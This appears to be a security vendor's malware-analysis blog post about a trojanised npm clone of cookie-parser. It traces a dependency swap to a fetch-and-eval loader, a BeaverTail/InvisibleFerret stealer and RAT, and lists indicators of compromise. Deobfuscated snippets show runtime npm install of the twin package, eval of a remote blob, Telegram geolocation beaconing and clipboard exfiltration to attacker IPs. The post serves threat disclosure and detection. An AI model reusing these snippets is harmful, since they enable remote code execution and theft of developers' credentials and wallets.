@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>clx-cookieparser: a cookie-parser clone whose evil twin is North Korean - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="clx-cookieparser: a cookie-parser clone whose evil twin is North Korean - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>clx-cookieparser: a cookie-parser clone whose evil twin is North Korean</h1>
+    <span class="post-meta">2026-05-28 &middot; npm &middot; clx-cookieparser</span>
+  </div>
+  <div class="post-body discovery-body">
+    <img src="/assets/images/clx-cookieparser-dprk-meme.jpg" alt="Meme: 'DPRK hiding in your npm's? It's more likely than you think.'">
+<p>The package you install is the genuine express cookie-parser, working middleware and passing tests included; the theft lives one swapped dependency away, in the attacker's twin <code>clx-cookie-signature</code>. That twin fetches a <a href="http://jsonkeeper.com">jsonkeeper.com</a> blob and <code>eval</code>s it, and the chain unrolls into BeaverTail dropping InvisibleFerret — the DPRK Contagious Interview kit, per <a href="https://dprk-research.kmsec.uk/">dprk-research.kmsec.uk</a>, exfiltrating through the same code and endpoint as <a href="/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/">web-dotenv</a> did a week earlier.</p>
+<h2 id="package-metadata" tabindex="-1"><a class="header-anchor" href="#package-metadata"><span>Package metadata</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td><code>clx-cookieparser</code></td>
+</tr>
+<tr>
+<td>Version</td>
+<td><code>1.4.7</code></td>
+</tr>
+<tr>
+<td>Publisher</td>
+<td><code>blockvanguard &lt;contact@vynlence.com&gt;</code></td>
+</tr>
+<tr>
+<td>Author</td>
+<td><code>TJ Holowaychuk &lt;tj@vision-media.ca&gt;</code></td>
+</tr>
+<tr>
+<td>Repository</td>
+<td><code>expressjs/cookie-parser</code></td>
+</tr>
+<tr>
+<td>Dependency</td>
+<td><code>clx-cookie-signature</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="the-version-walk" tabindex="-1"><a class="header-anchor" href="#the-version-walk"><span>The version walk</span></a></h2>
+<p>The early versions are bait: 1.4.4 and 1.4.5 ship the real cookie-parser byte-identical, with the <code>repository</code> shorthand creeping closer to upstream each release. By 1.4.7 the repo string matches exactly and the payload is switched on.</p>
+<table>
+<thead>
+<tr>
+<th>Version</th>
+<th><code>index.js</code></th>
+<th><code>repository</code> field</th>
+<th>Signing dependency</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.4.4</td>
+<td>clean (<code>cc0cdf98…</code>)</td>
+<td><code>expressjs/clx-cookieparser</code></td>
+<td><code>cookie-signature</code> (real)</td>
+<td>benign bait</td>
+</tr>
+<tr>
+<td>1.4.5</td>
+<td>clean (<code>cc0cdf98…</code>, identical)</td>
+<td><code>expressjs/cookieparser</code></td>
+<td><code>cookie-signature</code> (real)</td>
+<td>benign bait</td>
+</tr>
+<tr>
+<td>1.4.7</td>
+<td>weaponized (<code>1cbaf18…</code>)</td>
+<td><code>expressjs/cookie-parser</code></td>
+<td><code>clx-cookie-signature</code> (twin)</td>
+<td>live payload</td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-1-%E2%80%94-clx-cookieparser%3A-the-dependency-swap" tabindex="-1"><a class="header-anchor" href="#stage-1-%E2%80%94-clx-cookieparser%3A-the-dependency-swap"><span>Stage 1 — clx-cookieparser: the dependency swap</span></a></h2>
+<p>The weaponized 1.4.7 drops the real signing dependency and reaches for the attacker's twin, installing it on the spot if absent and exiting with a fake error if that fails. The parser below still works, so the developer sees green tests while the malice sits one <code>require()</code> away.</p>
+<pre class="lang-js"><code><span class="tok-kw">const</span> { execSync } = <span class="tok-builtin">require</span>(<span class="tok-str">'child_process'</span>);
+<span class="tok-kw">var</span> signature;
+<span class="tok-kw">try</span> {
+  signature = <span class="tok-builtin">require</span>(<span class="tok-str">'clx-cookie-signature'</span>)
+} <span class="tok-kw">catch</span> (err) {
+  <span class="tok-kw">try</span> {
+    <span class="tok-fn">execSync</span>(<span class="tok-str">`npm install clx-cookie-signature --no-warnings --no-save --no-progress --loglevel silent`</span>, { windowsHide: <span class="tok-kw">true</span> });
+    signature = <span class="tok-builtin">require</span>(<span class="tok-str">'clx-cookie-signature'</span>)
+  } <span class="tok-kw">catch</span> (error) {
+    console.<span class="tok-fn">log</span>(str); <span class="tok-com">// "Error: This environment is not supported…"</span>
+    process.<span class="tok-fn">exit</span>(<span class="tok-num">1</span>);
+  }
+}
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/impersonation/npm-clone::clx-cookieparser-cookie-parser-clone</code></td>
+<td>A package named <code>clx-cookieparser</code> carrying <code>expressjs/cookie-parser</code> as its repository</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/install-hook/scripts/dynamic-install::clx-cookieparser-runtime-stage-install</code></td>
+<td><code>execSync</code> npm install of the twin at require-time, <code>windowsHide: true</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/supply-chain/impersonation/npm-clone::cookie-parser-upstream-repo</code></td>
+<td>Repository shorthand points at <code>expressjs/cookie-parser</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-2-%E2%80%94-clx-cookie-signature%3A-the-courier" tabindex="-1"><a class="header-anchor" href="#stage-2-%E2%80%94-clx-cookie-signature%3A-the-courier"><span>Stage 2 — clx-cookie-signature: the courier</span></a></h2>
+<p>The twin is a faithful clone too, with one line bolted to the top: fetch a <a href="http://jsonkeeper.com">jsonkeeper.com</a> blob and hand it straight to <code>eval</code>. A second jsonkeeper link sits beside it, hex-encoded and never called — a spare key under the mat for when the first one dies.</p>
+<pre class="lang-js"><code><span class="tok-builtin">require</span>(<span class="tok-str">'axios'</span>).<span class="tok-fn">get</span>(<span class="tok-str">'https://www.jsonkeeper.com/b/MYUKZ'</span>).<span class="tok-fn">then</span>(r =&gt; { <span class="tok-fn">eval</span>(r.data.content_o); });
+<span class="tok-com">// dormant backup, hex-encoded, never invoked:</span>
+<span class="tok-com">//   https://www.jsonkeeper.com/b/HY6M6</span>
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/dropper/delivery/fetch-eval::axios-jsonkeeper-content-eval-loader</code></td>
+<td><code>eval(r.data.content_o)</code> on a <a href="http://jsonkeeper.com">jsonkeeper.com</a> response</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/impersonation/npm-clone::clx-cookie-signature-upstream-clone</code></td>
+<td>Clones the cookie-signature identity (<code>TJ Holowaychuk</code>, <code>visionmedia</code> repo)</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/anti-static/obfuscation/encoding/hex::hex-pair-regex-decode</code></td>
+<td><code>/../g</code> + <code>fromCharCode</code> decode behind the dormant HY6M6 link</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/command-and-control/infrastructure/paste::jsonkeeper</code></td>
+<td>cleave classifies <code>jsonkeeper.com</code> as paste-hosted delivery infrastructure</td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-3-%E2%80%94-the-jsonkeeper-loader" tabindex="-1"><a class="header-anchor" href="#stage-3-%E2%80%94-the-jsonkeeper-loader"><span>Stage 3 — the jsonkeeper loader</span></a></h2>
+<p>The bin holds two fields; the malware skips the <code>Server running</code> decoy and evals three chained functions. The first is the BeaverTail loader — install HTTP libs, beacon C2 with a campaign id, write <code>0001.dat</code>, run it; the second geolocates the victim through <a href="http://ipinfo.io">ipinfo.io</a> and DMs it to a Telegram bot; the third quietly exits if the hostname sits in a researcher/VM blocklist.</p>
+<pre class="lang-js"><code>content_n → console.<span class="tok-fn">log</span>(<span class="tok-str">'Server running'</span>)                 <span class="tok-com">// decoy</span>
+content_o → <span class="tok-kw">function</span> <span class="tok-fn">c2</span>() { <span class="tok-com">/* obfuscator.io loader, eval'd */</span> }
+</code></pre>
+<p>Deobfuscated, the <code>c3</code> profiler is the bluntest part of the chain.</p>
+<pre class="lang-js"><code><span class="tok-com">// Stage 3 c3(), deobfuscated — geolocate the victim, DM it to a Telegram bot</span>
+<span class="tok-kw">const</span> g = <span class="tok-kw">await</span> (<span class="tok-kw">await</span> <span class="tok-fn">fetch</span>(<span class="tok-str">'https://ipinfo.io/json?token=8e5005610fd390'</span>)).<span class="tok-fn">json</span>();
+<span class="tok-kw">await</span> <span class="tok-fn">fetch</span>(<span class="tok-str">'https://api.telegram.org/bot8201485511:AAF_…/sendMessage'</span>, {
+  method: <span class="tok-str">'POST'</span>,
+  headers: { <span class="tok-str">'Content-Type'</span>: <span class="tok-str">'application/json'</span> },
+  body: JSON.<span class="tok-fn">stringify</span>({ chat_id: <span class="tok-str">'8080359867'</span>,
+    text: <span class="tok-str">`Project is running...\n\nVisitor Info:\n IP: ${g.ip}, ${g.country}, ${g.city} ${g.longitude}`</span> })
+});
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/dropper/execution/network-stage::obfuscated-node-hidden-stage-scaffold</code></td>
+<td>Obfuscated Node loader: profile → install HTTP libs → beacon → write <code>0001.dat</code> → run</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/anti-static/obfuscation/tools/js-obfuscator::obfuscated-eval-npm-trojan</code></td>
+<td>Full <a href="http://obfuscator.io">obfuscator.io</a> toolkit wrapped around an eval</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>micro-behaviors/process/create/spawn::windowshide-obfuscated-expression</code></td>
+<td><code>windowsHide</code> set through a computed expression</td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-4-%E2%80%94-0001.dat%3A-the-invisibleferret-kit" tabindex="-1"><a class="header-anchor" href="#stage-4-%E2%80%94-0001.dat%3A-the-invisibleferret-kit"><span>Stage 4 — 0001.dat: the InvisibleFerret kit</span></a></h2>
+<p><code>0001.dat</code> is the orchestrator: re-obfuscated on every pull, it writes two modules to disk and spawns two more inline, and cleave tags two of them as Lazarus on the exfil endpoint alone.</p>
+<table>
+<thead>
+<tr>
+<th>Module</th>
+<th>Role</th>
+<th>Sink</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>scdata.js</code></td>
+<td><a href="http://Socket.IO">Socket.IO</a> RAT — remote shell, <code>node-pty</code> terminal, mouse/keyboard, desktop control</td>
+<td><code>216.126.225.83</code> (socket)</td>
+</tr>
+<tr>
+<td><code>ldata.js</code></td>
+<td>Browser + wallet stealer — <code>Login Data</code>, macOS keychain, 12+ wallet extensions</td>
+<td>bundled upload</td>
+</tr>
+<tr>
+<td><code>captured_spawn_11.js</code></td>
+<td>Recursive file grabber — <code>.aws</code>/<code>.ssh</code>/<code>.claude</code> dirs, <code>*.env*</code>/<code>*secret phrase*</code>/<code>*metamask*</code></td>
+<td><code>http://216.126.224.220:5976/upload</code></td>
+</tr>
+<tr>
+<td><code>captured_spawn_12.js</code></td>
+<td>Clipboard watcher — <code>pbpaste</code> / PowerShell <code>Get-Clipboard</code></td>
+<td><code>http://216.126.225.83/npm-compiler.log</code></td>
+</tr>
+</tbody>
+</table>
+<p>Deobfuscated, the clipboard watcher is the same routine web-dotenv ran.</p>
+<pre class="lang-js"><code><span class="tok-com">// Stage 4 captured_spawn_12.js, deobfuscated — clipboard watcher</span>
+<span class="tok-kw">const</span> clip = process.platform === <span class="tok-str">'darwin'</span>
+  ? <span class="tok-fn">execSync</span>(<span class="tok-str">'pbpaste'</span>, { encoding: <span class="tok-str">'utf8'</span> }).<span class="tok-fn">trim</span>()
+  : <span class="tok-fn">execSync</span>(<span class="tok-str">'powershell -NoProfile -NonInteractive Get-Clipboard'</span>, { encoding: <span class="tok-str">'utf8'</span>, windowsHide: <span class="tok-kw">true</span> }).<span class="tok-fn">trim</span>();
+<span class="tok-kw">await</span> axios.<span class="tok-fn">post</span>(<span class="tok-str">'http://216.126.225.83/npm-compiler.log'</span>,
+  { message: clip, host: os.<span class="tok-fn">hostname</span>(), uid: <span class="tok-str">'acd4ab…'</span>, t: <span class="tok-str">'101'</span> });
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/remote-command/control::node-socketio-remote-control-rat</code></td>
+<td><code>scdata.js</code>: <code>node-pty</code>, <code>mouseClick</code>, <code>keyTap</code>, terminal I/O over <a href="http://Socket.IO">Socket.IO</a></td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/exfiltration/stealer/credential/browser::js-browser-wallet-upload-exfil</code></td>
+<td><code>ldata.js</code>: MetaMask/Phantom/Coinbase extension IDs + <code>Login Data</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/exfiltration/stealer/file::js-targeted-file-upload-exfil</code></td>
+<td><code>captured_spawn_11.js</code>: <code>scanDir</code> over dev/config dirs → multipart upload</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/exfiltration/stealer/credential/clipboard::js-clipboard-exfil-external-ip</code></td>
+<td><code>captured_spawn_12.js</code>: <code>pbpaste</code> / <code>Get-Clipboard</code> → literal IPv4</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>well-known/malware/dropper/lazarus::makelog-url</code></td>
+<td><code>scdata.js</code> + <code>captured_spawn_12.js</code>: GlassWorm/Lazarus <code>/api/service/makelog</code> endpoint</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/credential-access/wallet/lazarus::wallet-extension-path</code></td>
+<td><code>ldata.js</code>: <code>/Local Extension Settings/</code> wallet path (Lazarus)</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/anti-analysis/vm-detect/vendor::comprehensive-evasion</code></td>
+<td><code>scdata.js</code> checks for <code>virtualbox</code> and other hypervisors</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/evasion/masquerade/process/title::process-title-npm-masquerade</code></td>
+<td><code>ldata.js</code> sets <code>process.title</code> to an <code>npm-</code>like name</td>
+</tr>
+</tbody>
+</table>
+<h2 id="same-operator-as-web-dotenv" tabindex="-1"><a class="header-anchor" href="#same-operator-as-web-dotenv"><span>Same operator as web-dotenv</span></a></h2>
+<p>This is the same kit as <a href="/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/">web-dotenv</a>: the file grabber ships to its exact endpoint <code>http://216.126.224.220:5976/upload</code>, the clipboard watcher posts to the same <code>/npm-compiler.log</code>, and the target allow-list, obfuscator, <code>userkey</code> header, and jsonkeeper staging all match. A BeaverTail loader pulling an InvisibleFerret stealer through a fake npm dependency is the Contagious Interview playbook CrowdStrike pins on FAMOUS CHOLLIMA, and cleave reaches the verdict unprompted: the exfil endpoint trips its Lazarus <code>makelog-url</code> rule and the stealer trips a Lazarus wallet-path rule.</p>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1.4.7</code> index.js SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/1cbaf1823f0b004173454333a22b770fa1c36825b02b81bb258223c3fb6fc7b8"><code>1cbaf1823f0b004173454333a22b770fa1c36825b02b81bb258223c3fb6fc7b8</code></a></td>
+</tr>
+<tr>
+<td><code>1.4.4</code> / <code>1.4.5</code> index.js SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/cc0cdf989e892a9f282f17b7511133916ed90e9cb3fbb49db60fe44ce3aece56"><code>cc0cdf989e892a9f282f17b7511133916ed90e9cb3fbb49db60fe44ce3aece56</code></a></td>
+</tr>
+<tr>
+<td><code>1.4.7</code> tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/aa0717bcd8e84d37588654679f1b79b21ee81fd0b65aaf1ab4324f7e5ea13973"><code>aa0717bcd8e84d37588654679f1b79b21ee81fd0b65aaf1ab4324f7e5ea13973</code></a></td>
+</tr>
+<tr>
+<td>Companion index.js SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/9eb97dcae23527bc66606235e0ad5d2c89692d311120dec3a636acf479e53047"><code>9eb97dcae23527bc66606235e0ad5d2c89692d311120dec3a636acf479e53047</code></a></td>
+</tr>
+<tr>
+<td>Companion tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/5f22aac4634708cd73c3e2fc3e1ff94e2c4d48b0be8368351a2c707a8fd84819"><code>5f22aac4634708cd73c3e2fc3e1ff94e2c4d48b0be8368351a2c707a8fd84819</code></a></td>
+</tr>
+<tr>
+<td>Stage-2 loader</td>
+<td><code>https://www.jsonkeeper.com/b/MYUKZ</code></td>
+</tr>
+<tr>
+<td>Stage-2 backup (dormant)</td>
+<td><code>https://www.jsonkeeper.com/b/HY6M6</code></td>
+</tr>
+<tr>
+<td>Stage-3 geolocation source</td>
+<td><code>https://ipinfo.io/json?token=8e5005610fd390</code></td>
+</tr>
+<tr>
+<td>Stage-3 Telegram exfil</td>
+<td><code>https://api.telegram.org/bot8201485511:AAF_K37O2EByZaAMns3K3AFfqUH-cVYQJ74/sendMessage</code> (chat_id <code>8080359867</code>)</td>
+</tr>
+<tr>
+<td>Stage-3 sandbox blocklist</td>
+<td><code>Home PC, suraj, imran, Rishabh Verma, vboxuser, Shah faisal, Developer, Programador</code></td>
+</tr>
+<tr>
+<td>Stage-3/4 C2</td>
+<td><code>http://216.126.225.83/api/service/acd4ab512f1e10ba62a6f23b7038b725</code></td>
+</tr>
+<tr>
+<td>Stage-4 loader</td>
+<td><code>$TMPDIR/0001.dat</code> (re-obfuscated per fetch; snapshots <code>b0eb15b8…</code>, <code>3231629620…</code>)</td>
+</tr>
+<tr>
+<td><code>scdata.js</code> (<a href="http://Socket.IO">Socket.IO</a> RAT) SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/126d0ed4e6c29d54625884bedcd164af2c38bc887a198d03ad1cf0fd8fe9b761"><code>126d0ed4e6c29d54625884bedcd164af2c38bc887a198d03ad1cf0fd8fe9b761</code></a></td>
+</tr>
+<tr>
+<td><code>ldata.js</code> (browser/wallet stealer) SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/38b4d90b63e49abd76fb8974379c9c75af032ab259cc138d1a88baf3c27dfaa3"><code>38b4d90b63e49abd76fb8974379c9c75af032ab259cc138d1a88baf3c27dfaa3</code></a></td>
+</tr>
+<tr>
+<td><code>captured_spawn_11.js</code> (file grabber) SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/0de58bc71e6a7f7e0fd1a174a1413765a727e460edd79386a0c0359b6b0498b0"><code>0de58bc71e6a7f7e0fd1a174a1413765a727e460edd79386a0c0359b6b0498b0</code></a></td>
+</tr>
+<tr>
+<td><code>captured_spawn_12.js</code> (clipboard) SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/98485250e2ed047b5f893fcdaa2a779614972063a4c3587b9046256b0ddb8b45"><code>98485250e2ed047b5f893fcdaa2a779614972063a4c3587b9046256b0ddb8b45</code></a></td>
+</tr>
+<tr>
+<td>File exfil</td>
+<td><code>http://216.126.224.220:5976/upload</code> (multipart)</td>
+</tr>
+<tr>
+<td>Clipboard exfil</td>
+<td><code>http://216.126.225.83/npm-compiler.log</code></td>
+</tr>
+<tr>
+<td>RAT C2</td>
+<td><code>216.126.225.83</code> (<a href="http://Socket.IO">Socket.IO</a>), <code>/api/service/makelog</code></td>
+</tr>
+<tr>
+<td>Hosting</td>
+<td><code>216.126.224.0/22</code> (<a href="http://Tier.Net">Tier.Net</a>)</td>
+</tr>
+</tbody>
+</table>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
